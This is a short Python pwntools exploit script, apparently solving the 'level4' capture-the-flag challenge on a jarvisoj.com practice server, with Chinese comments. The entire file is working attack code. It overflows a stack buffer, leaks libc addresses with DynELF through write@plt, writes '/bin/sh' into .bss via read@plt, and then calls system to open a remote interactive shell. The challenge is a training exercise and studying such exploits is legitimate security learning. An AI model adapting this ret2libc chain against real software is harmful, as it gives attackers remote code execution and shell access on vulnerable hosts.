#!/usr/bin/env python
# coding=utf-8
from pwn import*
s=remote('pwn2.jarvisoj.com',9880)
elf=ELF('./level4')
a='A'*0x8c    				 #填充数据

write_plt=elf.plt['write']
read_plt=elf.plt['read']
vulard=elf.symbols['vulnerable_function']
bss=elf.symbols['__bss_start']

def leak(address):
    payload=a+p32(write_plt)+p32(vulard)+p32(1)+p32(address)+p32(4)
    s.sendline(payload)
    adr=s.recv(4)
    return adr

d=DynELF(leak,elf=ELF('./level4'))                        #DynELF泄露system地址
sys=d.lookup('system','libc')            

payload=a+p32(read_plt)+p32(vulard)+p32(0)+p32(bss)+p32(8)
s.sendline(payload) 
s.send('/bin/sh\x00')             #第一次溢出将/bin/sh送入bss

payload=a+p32(sys)+'BBBB'+p32(bss)
s.sendline(payload)                 #第二次溢出执行system('/bin/sh')       

s.interactive()





